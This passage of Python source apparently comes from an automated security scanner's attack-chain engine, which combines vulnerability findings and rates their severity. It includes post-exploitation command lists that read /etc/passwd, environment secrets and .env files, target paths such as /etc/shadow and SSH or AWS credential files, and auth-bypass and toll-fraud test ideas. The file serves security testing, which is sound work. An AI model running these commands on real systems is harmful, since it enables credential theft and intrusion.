                        {"module": "session_abuse", "finding": session_type, "endpoint": endpoint},
                        {"module": "xss", "finding": "xss", "endpoint": xss_url},
                    ],
                    "chain_steps": [
                        f"1. Session weakness: {session_type} at {endpoint}",
                        f"2. XSS confirmed at {xss_url}",
                        "3. Attacker injects XSS payload → steals JWT/session token",
                        "4. Token not invalidated → persistent access even after password change",
                        "5. Result: Persistent Account Takeover",
                    ],
                    "impact": "Attacker maintains access even if victim changes password or logs out",
                },
            })
        else:
            # Session weakness without XSS — still report the chain potential
            findings.append({
                "type": "session_chain_candidate",
                "name": f"Session Weakness → ATO Chain Candidate ({session_type})",
                "severity": "HIGH",
                "confidence": 75,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Session weakness ({session_type}) at {endpoint}. "
                    "If combined with XSS or token theft vector, enables persistent ATO."
                ),
                "metadata": {
                    "chain_type": "session_chain_candidate",
                    "needs": ["XSS or token theft vector"],
                },
            })

        return findings

    async def _business_idor_fraud_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Business Logic + IDOR → Financial Fraud chain.

        Queries SharedFindingsStore for IDOR findings to compose with business logic flaws.
        """
        findings = []
        store = self._get_store()
        endpoint = finding.get("matched_at", "")
        biz_name = finding.get("name", "business logic flaw")

        # Query for IDOR findings
        idor_findings = store.get_findings_by_type(VulnType.IDOR)
        # Also check for auth bypass findings
        auth_findings = store.get_findings_by_type(VulnType.AUTH_BYPASS)

        if idor_findings:
            idor_info = idor_findings[0]
            findings.append({
                "type": "business_idor_fraud_chain",
                "name": "Business Logic + IDOR → Multi-Account Financial Fraud (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 85,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Business logic flaw ({biz_name}) at {endpoint} combined with "
                    f"IDOR at {idor_info.endpoint} enables multi-account financial fraud. "
                    "Attacker can exploit pricing/quantity manipulation across multiple accounts."
                ),
                "metadata": {
                    "chain_type": "business_plus_idor_fraud",
                    "is_cross_module": True,
                    "chain_components": [
                        {"module": "business_logic", "finding": biz_name, "endpoint": endpoint},
                        {"module": "idor", "finding": idor_info.type, "endpoint": idor_info.endpoint},
                    ],
                    "chain_steps": [
                        f"1. Business logic: {biz_name} at {endpoint}",
                        f"2. IDOR: {idor_info.type} at {idor_info.endpoint}",
                        "3. Attacker manipulates prices/quantities via business logic flaw",
                        "4. IDOR allows repeating across multiple user accounts",
                        "5. Result: Scaled financial fraud",
                    ],
                },
            })

        if auth_findings:
            auth_info = auth_findings[0]
            findings.append({
                "type": "business_auth_fraud_chain",
                "name": "Business Logic + Auth Bypass → Unauthorized Transaction (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 85,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Business logic flaw ({biz_name}) combined with auth bypass "
                    f"({auth_info.type}) enables unauthorized financial transactions."
                ),
                "metadata": {
                    "chain_type": "business_plus_auth",
                    "is_cross_module": True,
                    "chain_components": [
                        {"module": "business_logic", "finding": biz_name, "endpoint": endpoint},
                        {"module": "auth", "finding": auth_info.type, "endpoint": auth_info.endpoint},
                    ],
                },
            })

        if not idor_findings and not auth_findings:
            # Standalone business logic — still valuable
            findings.append({
                "type": "business_fraud_chain",
                "name": f"Business Logic Flaw → Financial Impact ({biz_name})",
                "severity": "HIGH",
                "confidence": 80,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Business logic flaw ({biz_name}) at {endpoint} enables financial manipulation."
                ),
                "metadata": {
                    "chain_type": "business_fraud",
                    "escalation_paths": [
                        "Combine with IDOR for multi-account exploitation",
                        "Combine with auth bypass for unauthorized transactions",
                    ],
                },
            })

        return findings

    async def _ssti_post_exploit_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        SSTI with RCE → Post-Exploitation chain.

        Uses captured RCE output to prove credential theft and further exploitation.
        """
        findings = []
        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
        rce_output = context.get("ssti_rce_output", "")
        has_rce = context.get("ssti_has_rce", False)

        if not rce_output:
            rce_output = finding.get("metadata", {}).get("rce_output", "")
            has_rce = finding.get("metadata", {}).get("rce_confirmed", False)

        if has_rce and rce_output:
            findings.append({
                "type": "ssti_rce_post_exploit_chain",
                "name": "SSTI → RCE → Server Compromise (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 95,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"Server-Side Template Injection at {endpoint} achieves Remote Code Execution. "
                    f"RCE output captured: {rce_output[:100]}. "
                    "Full server compromise possible."
                ),
                "metadata": {
                    "chain_type": "ssti_to_server_compromise",
                    "is_cross_module": True,
                    "rce_output": rce_output,
                    "chain_steps": [
                        f"1. SSTI confirmed at {endpoint}",
                        "2. Template engine sandbox escaped → RCE achieved",
                        f"3. Command output: {rce_output[:200]}",
                        "4. Post-exploitation: read /etc/passwd, env vars, DB credentials",
                        "5. Lateral movement: use extracted credentials for other services",
                    ],
                    "post_exploit_commands": [
                        "cat /etc/passwd",
                        "env | grep -i password",
                        "cat /proc/self/environ",
                        "find / -name '*.env' 2>/dev/null",
                        "cat /var/www/*/.env 2>/dev/null",
                    ],
                },
            })
        elif has_rce:
            findings.append({
                "type": "ssti_rce_chain",
                "name": "SSTI → RCE Confirmed (Server Compromise Ready)",
                "severity": "CRITICAL",
                "confidence": 90,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"SSTI at {endpoint} achieves RCE. Post-exploitation possible."
                ),
                "metadata": {
                    "chain_type": "ssti_rce",
                    "rce_confirmed": True,
                },
            })

        return findings

    async def _xxe_credential_chain(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        XXE → File Read → Credential Extraction chain.

        Uses captured file content to identify credentials and chain to auth.
        """
        findings = []
        endpoint = finding.get("matched_at", context.get("vulnerable_endpoint", ""))
        file_content = context.get("xxe_file_content", "")
        has_creds = context.get("xxe_has_credentials", False)

        if not file_content:
            file_content = finding.get("metadata", {}).get("file_content", "")

        if file_content and has_creds:
            # Extract credential indicators
            cred_indicators = []
            for line in file_content.split("\n"):
                line_lower = line.lower()
                if any(kw in line_lower for kw in ["password", "secret", "api_key", "token", "aws_", "db_"]):
                    cred_indicators.append(line.strip()[:100])

            findings.append({
                "type": "xxe_credential_chain",
                "name": "XXE → File Read → Credential Extraction (Proven Chain)",
                "severity": "CRITICAL",
                "confidence": 95,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"XXE at {endpoint} extracted file content containing credentials. "
                    f"Found {len(cred_indicators)} credential indicators."
                ),
                "metadata": {
                    "chain_type": "xxe_to_credential_theft",
                    "is_cross_module": True,
                    "chain_steps": [
                        f"1. XXE confirmed at {endpoint}",
                        "2. File disclosure exploited → sensitive file content extracted",
                        f"3. {len(cred_indicators)} credential patterns found in file",
                        "4. Use extracted credentials for authentication/lateral movement",
                    ],
                    "credential_indicators": cred_indicators[:10],
                    "file_content_preview": file_content[:300],
                },
            })
        elif file_content:
            # File content extracted but no obvious credentials
            findings.append({
                "type": "xxe_data_breach_chain",
                "name": "XXE → Sensitive File Disclosure (Data Breach)",
                "severity": "HIGH",
                "confidence": 85,
                "matched_at": endpoint,
                "url": endpoint,
                "description": (
                    f"XXE at {endpoint} extracted sensitive file content. "
                    "Further exploitation may reveal credentials."
                ),
                "metadata": {
                    "chain_type": "xxe_data_breach",
                    "file_content_preview": file_content[:200],
                    "next_targets": [
                        "/etc/shadow", "~/.ssh/id_rsa", "/var/www/.env",
                        "/proc/self/environ", "~/.aws/credentials",
                    ],
                },
            })

        return findings

    async def _speculative_comms_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
        """
        Speculative chain: Suggest communications platform attack paths.
        """
        target = context.get("target", "")

        return [{
            "type": "speculative_comms_chain",
            "name": "Communications Platform Detected → High-Value Attack Paths",
            "severity": "INFO",
            "confidence": 60,
            "matched_at": target,
            "url": target,
            "description": (
                "Twilio/SendGrid/Authy platform detected. "
                "These platforms have historically paid $5k-$50k for critical findings."
            ),
            "metadata": {
                "chain_type": "speculative_comms",
                "is_speculative": True,
                "recommended_tests": [
                    {
                        "name": "Phone Number Enumeration (CVE-2024-39891)",
                        "description": "Test registration/verify endpoints for enumeration",
                        "endpoints": ["/authy/users/new", "/verify/lookup", "/protected/json/users"],
                        "bounty_potential": "$5k-$15k",
                    },
                    {
                        "name": "SMS Pumping / Toll Fraud",
                        "description": "Check for rate limiting on SMS endpoints",
                        "endpoints": ["/Messages.json", "/Calls.json", "/verify/start"],
                        "bounty_potential": "$10k-$50k",
                    },
                    {
                        "name": "Twilio Credential in Responses",
                        "description": "Look for ACxxxxxxxx (SID) or SKxxxxxxxx (API key) patterns",
                        "bounty_potential": "$15k-$50k",
                    },
                    {
                        "name": "Auth Bypass (CVE-2020-24655)",
                        "description": "Test null injection: pin=@null, code=null, token=''",
                        "bounty_potential": "$10k-$50k",
                    },
                    {
                        "name": "OTP Brute Force",
                        "description": "Test rate limiting on verification code checks",
                        "bounty_potential": "$5k-$15k",
                    },
                ],
                "historical_bounties": [
                    "CVE-2024-39891: Authy phone enumeration - affected 33M users",
                    "CVE-2020-24655: Authy PIN bypass - authentication bypass",
                    "SMS Pumping: Fraud Guard saved $62.7M from toll fraud",
                ],
            },
        }]

    # ════════════════════════════════════════════════════════════════════════
    # TECHNOLOGY-BASED SPECULATIVE CHAIN GENERATION
    # ════════════════════════════════════════════════════════════════════════

    async def generate_speculative_chains(self, technologies: List[str], target: str) -> List[Dict]:
        """
        Generate speculative attack chains based on detected technologies.
        This is called even when no vulnerabilities are confirmed, to suggest
        high-value attack paths for manual testing.

        SAFETY: These are recommendations only, not exploits.
        """
        chains = []
        tech_lower = [str(t).lower() for t in technologies]

        # AWS/CloudFront speculative chains
        if any("aws" in t or "cloudfront" in t or "amazon" in t for t in tech_lower):
            self.context["technologies"] = technologies
            self.context["target"] = target
            aws_chains = await self._speculative_aws_attack_paths({}, self.context)
            chains.extend(aws_chains)

        # API speculative chains
        if "api" in target.lower() or any("api" in t for t in tech_lower):
            self.context["target"] = target
            api_chains = await self._speculative_api_attack_paths({}, self.context)
            chains.extend(api_chains)

        # Communications platform speculative chains (Twilio, SendGrid, Authy, Segment)
        comms_domains = ["twilio", "sendgrid", "authy", "segment"]
        if any(domain in target.lower() for domain in comms_domains):
            self.context["target"] = target
            comms_chains = await self._speculative_comms_attack_paths({}, self.context)
            chains.extend(comms_chains)

        return chains

    def get_statistics(self) -> Dict[str, Any]:
        """Get chain engine statistics."""
        successful = [r for r in self.chain_results if r.success]
        failed = [r for r in self.chain_results if not r.success]

        return {
            "total_findings_processed": len(self.findings_processed),
            "total_chains_executed": len(self.chain_results),
            "successful_chains": len(successful),
            "failed_chains": len(failed),
            "total_chain_findings": sum(len(r.findings) for r in successful),
            "average_execution_time": (
                sum(r.execution_time for r in self.chain_results) / len(self.chain_results)
                if self.chain_results else 0
            ),
        }

    # ═══════════════════════════════════════════════════════════════════════════════
    # CHAIN QUALITY CONTROL - Deduplication, Validation, and Strength Rating
    # Prevents inflated/duplicate chains and false positive chain suggestions
    # ═══════════════════════════════════════════════════════════════════════════════

    # Chains that require specific target characteristics
    CHAIN_CONTEXT_REQUIREMENTS: Dict[str, Dict[str, Any]] = {
        # SSRF → Internal Breach requires actual internal services
        "ssrf_internal_services": {
            "requires_any": ["has_internal_endpoints", "is_cloud_hosted", "has_kubernetes"],
            "description": "SSRF to internal breach requires internal services to target",
        },
        "ssrf_internal_port_scan": {
            "requires_any": ["has_internal_endpoints", "is_cloud_hosted"],
            "description": "SSRF port scan needs internal network access",
        },
        # Cloud chains require cloud presence
        "ssrf_cloud_metadata": {
            "requires_any": ["is_cloud_hosted", "has_aws", "has_gcp", "has_azure"],
            "description": "Cloud metadata requires cloud-hosted infrastructure",
        },
        "ssrf_aws_imds_v2": {
            "requires_any": ["has_aws", "is_cloud_hosted"],
            "description": "AWS IMDS requires AWS infrastructure",
        },
        # LFI log poisoning requires writable logs
        "lfi_log_poisoning": {
            "requires_any": ["has_apache", "has_nginx", "has_php"],
            "description": "Log poisoning requires web server with accessible logs",
        },
    }

    # Weak chain combinations that shouldn't be rated HIGH/CRITICAL
    WEAK_CHAIN_PATTERNS: List[Dict[str, Any]] = [
        {
            "vulns": {"xss", "crlf"},
            "max_severity": "MEDIUM",
            "reason": "XSS + CRLF is weak chain without additional impact",
        },
        {
            "vulns": {"xss", "csrf"},
            "conditions": ["same_domain", "no_sensitive_action"],
            "max_severity": "MEDIUM",
            "reason": "XSS + CSRF needs sensitive action for ATO",
        },
        {
            "vulns": {"open_redirect"},
            "max_severity": "LOW",
            "reason": "Open redirect alone has limited impact",
        },
        {
            "vulns": {"information_disclosure"},
            "max_severity": "LOW",
            "reason": "Info disclosure needs exploitation path",
        },
    ]

    # Duplicate chain patterns to merge
    DUPLICATE_CHAIN_PATTERNS: List[Dict[str, Any]] = [
        {
            "pattern": ["xss", "csrf"],
            "variations": [["csrf", "xss"], ["xss", "session_fixation"]],
            "keep": "first",
        },
        {
            "pattern": ["auth_bypass", "privilege_escalation"],
            "variations": [["authentication_bypass", "priv_esc"]],
            "keep": "first",
        },
    ]

    def validate_and_deduplicate_chains(
        self,
        chains: List[Dict[str, Any]],
        target_context: Optional[Dict[str, Any]] = None,
    ) -> List[Dict[str, Any]]:
        """
        Clean up chains: deduplicate, validate context, and rate strength.

        Args:
            chains: List of chain findings
            target_context: Context about the target (technologies, hosting, etc.)

        Returns:
            Cleaned list of validated chains
        """
        if not chains:
            return []

        context = target_context or self.context or {}

        # Step 1: Deduplicate similar chains
        unique_chains = self._deduplicate_chains(chains)
        logger.debug(f"Chain dedup: {len(chains)} → {len(unique_chains)}")

        # Step 2: Validate chains make sense for target
        valid_chains = []
        for chain in unique_chains:
            is_valid, reason = self._validate_chain_context(chain, context)
            if is_valid:
                valid_chains.append(chain)
            else:
                logger.debug(f"Chain rejected: {chain.get('type', 'unknown')} - {reason}")

        logger.debug(f"Chain validation: {len(unique_chains)} → {len(valid_chains)}")

        # Step 3: Rate chain strength and adjust severity
        rated_chains = []
        for chain in valid_chains:
            rated_chain = self._rate_chain_strength(chain, context)
            rated_chains.append(rated_chain)

        return rated_chains

    def _deduplicate_chains(self, chains: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Remove duplicate and near-duplicate chains.

        Deduplication rules:
        - Same vulnerability types in chain → keep highest confidence
        - XSS + CSRF and CSRF + XSS → keep first occurrence
        - Same endpoint different chain → merge if overlapping
        """
        if not chains:
            return []

        seen_signatures: Dict[str, Dict[str, Any]] = {}
        unique_chains = []

        for chain in chains:
            # Generate chain signature for deduplication
            signature = self._get_chain_signature(chain)

            if signature in seen_signatures:
                existing = seen_signatures[signature]
                # Keep the one with higher confidence
                existing_conf = existing.get("confidence", 0)
                new_conf = chain.get("confidence", 0)

                # Normalize confidence if string
                if isinstance(existing_conf, str):
                    existing_conf = {"HIGH": 0.9, "MEDIUM": 0.7, "LOW": 0.5}.get(existing_conf.upper(), 0.5)
                if isinstance(new_conf, str):
                    new_conf = {"HIGH": 0.9, "MEDIUM": 0.7, "LOW": 0.5}.get(new_conf.upper(), 0.5)

                if new_conf > existing_conf:
                    # Replace with higher confidence chain
                    idx = unique_chains.index(existing)
                    unique_chains[idx] = chain
                    seen_signatures[signature] = chain
            else:
                seen_signatures[signature] = chain
                unique_chains.append(chain)

        return unique_chains

    def _get_chain_signature(self, chain: Dict[str, Any]) -> str:
        """Generate a signature for chain deduplication."""
        # Extract vulnerability types from chain
        chain_type = chain.get("type", "").lower()
        vulns = chain.get("vulnerabilities", [])

        if isinstance(vulns, list):
            vuln_types = sorted([v.get("type", "").lower() if isinstance(v, dict) else str(v).lower() for v in vulns])
        else:
            vuln_types = [chain_type]

        # Also consider the chain description for uniqueness
        description = chain.get("description", "").lower()

        # Normalize common variations
        normalized_vulns = []
        for v in vuln_types:
            v = v.replace("_", "").replace("-", "").replace(" ", "")
            # Map variations to canonical names
            if "xss" in v or "crosssite" in v:
                normalized_vulns.append("xss")
            elif "csrf" in v or "requestforgery" in v:
                normalized_vulns.append("csrf")
            elif "sqli" in v or "sqlinjection" in v:
                normalized_vulns.append("sqli")
            elif "ssrf" in v or "serverside" in v:
                normalized_vulns.append("ssrf")
            elif "auth" in v and "bypass" in v:
                normalized_vulns.append("authbypass")
            elif "priv" in v and ("esc" in v or "elev" in v):
                normalized_vulns.append("privesc")
            else:
                normalized_vulns.append(v)

        # Sort for consistent ordering
        normalized_vulns = sorted(set(normalized_vulns))

        # Include endpoint if available
        endpoint = chain.get("url", chain.get("matched_at", ""))
        if endpoint:
            parsed = urlparse(endpoint)
            endpoint_key = parsed.path[:50]  # First 50 chars of path
        else:
            endpoint_key = ""

        return f"{'-'.join(normalized_vulns)}:{endpoint_key}"

    def _validate_chain_context(
        self,
        chain: Dict[str, Any],
        context: Dict[str, Any]
    ) -> tuple[bool, str]:
        """
        Validate if a chain makes sense for the target context.

        Returns:
            (is_valid, reason) tuple
        """
        chain_type = chain.get("type", "").lower()
        chain_action = chain.get("chain_action", chain.get("action", "")).lower()

        # Check specific chain requirements
        for action_key, requirements in self.CHAIN_CONTEXT_REQUIREMENTS.items():
            if action_key in chain_type or action_key in chain_action:
                requires_any = requirements.get("requires_any", [])

                if requires_any:
                    # Check if any required context is present
                    has_required = any(context.get(req) for req in requires_any)

                    if not has_required:
                        return False, requirements.get("description", "Missing required context")

        # Check for speculative chains on simple targets
        is_speculative = chain.get("is_speculative", False) or "speculative" in chain_type
        if is_speculative:
            # Speculative chains on simple apps without cloud/internal infra are low value
            has_complexity = any([
                context.get("is_cloud_hosted"),
                context.get("has_internal_endpoints"),
                context.get("has_microservices"),
                context.get("has_kubernetes"),
                len(context.get("technologies", [])) > 3,
            ])

            if not has_complexity and "internal" in chain_type.lower():
                return False, "Speculative internal chain on simple target"

        return True, "Valid"

    def _rate_chain_strength(
        self,
        chain: Dict[str, Any],
        context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Rate chain strength and adjust severity if needed.

        Weak chains are downgraded, strong chains remain as-is.
        """
        chain = chain.copy()  # Don't modify original

        # Extract vulnerability types from chain
        chain_vulns = set()
        vulns = chain.get("vulnerabilities", [])
        if isinstance(vulns, list):
            for v in vulns:
                if isinstance(v, dict):
                    chain_vulns.add(v.get("type", "").lower().replace("_", "").replace("-", ""))
                else:
                    chain_vulns.add(str(v).lower().replace("_", "").replace("-", ""))

        # Also check chain type
        chain_type = chain.get("type", "").lower()
        if "xss" in chain_type:
            chain_vulns.add("xss")
        if "csrf" in chain_type:
            chain_vulns.add("csrf")
        if "crlf" in chain_type:
            chain_vulns.add("crlf")

        # Check against weak patterns
        current_severity = chain.get("severity", "MEDIUM").upper()
        severity_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
        current_level = severity_order.get(current_severity, 2)

        for pattern in self.WEAK_CHAIN_PATTERNS:
            pattern_vulns = pattern.get("vulns", set())

            # Check if chain matches weak pattern
            if pattern_vulns.issubset(chain_vulns) or chain_vulns.issubset(pattern_vulns):
                max_severity = pattern.get("max_severity", "MEDIUM")
                max_level = severity_order.get(max_severity, 2)

                # Downgrade if current severity exceeds max for weak chain
                if current_level > max_level:
                    chain["severity"] = max_severity
                    chain["severity_reason"] = pattern.get("reason", "Weak chain pattern")
                    logger.debug(f"Chain downgraded: {current_severity} → {max_severity} ({pattern.get('reason')})")
                    break

        # Mark speculative chains appropriately
        if chain.get("is_speculative") and current_severity in ["CRITICAL", "HIGH"]:
            if not chain.get("verified", False):
                chain["severity"] = "MEDIUM"
                chain["severity_reason"] = "Speculative chain (not verified)"

        return chain

    def get_chain_quality_report(self, chains: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate a quality report for chains."""
        if not chains:
            return {"total": 0, "quality": "N/A"}

        # Count by strength
        critical = sum(1 for c in chains if c.get("severity", "").upper() == "CRITICAL")
        high = sum(1 for c in chains if c.get("severity", "").upper() == "HIGH")
        medium = sum(1 for c in chains if c.get("severity", "").upper() == "MEDIUM")
        low = sum(1 for c in chains if c.get("severity", "").upper() in ["LOW", "INFO"])

        # Count verified vs speculative
        verified = sum(1 for c in chains if c.get("verified", False))
        speculative = sum(1 for c in chains if c.get("is_speculative", False))

        # Calculate quality score
        quality_score = (
            critical * 10 + high * 7 + medium * 4 + low * 1
        ) / len(chains) if chains else 0

        return {
            "total": len(chains),
            "by_severity": {
                "critical": critical,
                "high": high,
                "medium": medium,
                "low": low,
            },
            "verified": verified,
            "speculative": speculative,
            "quality_score": round(quality_score, 2),
            "quality": (
                "Excellent" if quality_score >= 8 else
                "Good" if quality_score >= 5 else
                "Fair" if quality_score >= 3 else
                "Weak"
            ),
        }
